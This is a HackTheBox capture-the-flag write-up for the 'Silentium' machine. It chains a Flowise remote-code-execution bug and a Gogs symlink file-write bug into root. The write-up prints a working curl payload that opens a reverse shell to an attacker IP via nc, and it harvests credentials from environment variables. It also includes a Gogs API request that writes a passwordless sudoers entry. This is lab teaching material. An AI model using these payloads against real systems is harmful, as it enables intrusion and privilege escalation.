# Silentium - HackTheBox Writeup

**Linux | Flowise + Gogs | Easy**

---

## Enumeration

Target runs Flowise (port 3000) and Gogs (port 3001) on the host, with Flowise also containerized internally.

API token for Flowise obtained via authentication bypass in `/forgot-password` endpoint.

---

## Exploitation

### Stage 1: Flowise RCE (CVE-2025-59528)

**Endpoint:** `POST /api/v1/node-load-method/customMCP`

**Vulnerability:** The `mcpServerConfig` parameter is passed directly to `Function('return ' + input)()` without sanitization.

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.exec(\"bash -i 2>&1 | nc 10.10.14.192 4444\");return 1;})()})"
    }
  }'
```

**Result:** Root shell in container.

**Pivot:** Environment variables contain SSH credentials:

```bash
env | grep -i password
```

```bash
ssh ben@silentium.htb
```

Now on the host (Ubuntu 24.04, Kernel 6.8.0-107).

---

### Stage 2: Gogs CVE-2025-8110 → Sudoers Write

**Discovery:**

```bash
ps aux | grep gogs
ss -tulpn | grep 3001
```

Gogs runs as root on localhost:3001. Ben has account with API token access.

**Vulnerability:** Gogs allows symlinks in repositories and applies user-supplied content via API PUT requests without validating symlink targets.

**Exploitation:**

1. Create API token (Gogs UI → Settings → Applications):
```
c06cd13713ef7fabee965264d0d9e04d451be23f
```

2. Clone repository:
```bash
git clone http://127.0.0.1:3001/ben/test.git
cd test
git config user.email "ben@silentium.htb"
git config user.name "ben"
```

3. Create symlink to sudoers:
```bash
ln -s /etc/sudoers.d/ben malicious_link
git add malicious_link
git commit -m "Add symlink"
git push origin master
```

4. Write sudoers entry via API:
```bash
CONTENT=$(echo -n "ben ALL=(ALL) NOPASSWD: ALL" | base64 -w0)

curl -X PUT "http://127.0.0.1:3001/api/v1/repos/ben/test/contents/malicious_link" \
  -H "Authorization: token c06cd13713ef7fabee965264d0d9e04d451be23f" \
  -H "Content-Type: application/json" \
  -d "{\"message\":\"Exploit\",\"content\":\"$CONTENT\"}"
```

5. Verify and escalate:
```bash
sudo -l
# User ben may run the following commands on silentium:
#     (ALL) NOPASSWD: ALL

sudo cat /root/root.txt
sudo cat /home/ben/user.txt
```

---

## Timeline

| Step | Time |
|------|------|
| Flowise RCE | 15 min |
| Container → SSH pivot | 20 min |
| Gogs discovery | 10 min |
| CVE-2025-8110 manual exploitation | 45 min |
| Root access | 5 min |
| **Total** | **~1.5 hours** |

---

## References

- CVE-2025-59528: Flowise insecure code evaluation
- CVE-2025-8110: Gogs symlink arbitrary file write via API
